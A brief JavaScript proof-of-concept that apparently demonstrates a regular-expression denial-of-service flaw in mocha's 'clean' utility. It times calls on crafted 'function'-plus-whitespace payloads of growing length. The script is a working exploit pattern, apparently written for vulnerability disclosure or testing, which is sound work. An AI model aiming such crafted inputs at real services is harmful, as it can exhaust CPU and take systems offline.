import {clean} from "mocha/lib/utils.js"

for(var i = 1; i <= 50; i++) {
        var time = Date.now();
        var payload = "function"+" ".repeat(i*10000)+"ready-research"
        clean(payload)
        var time_cost = Date.now() - time;
        console.log("Payload length : " + payload.length + ": " + time_cost+" ms");
}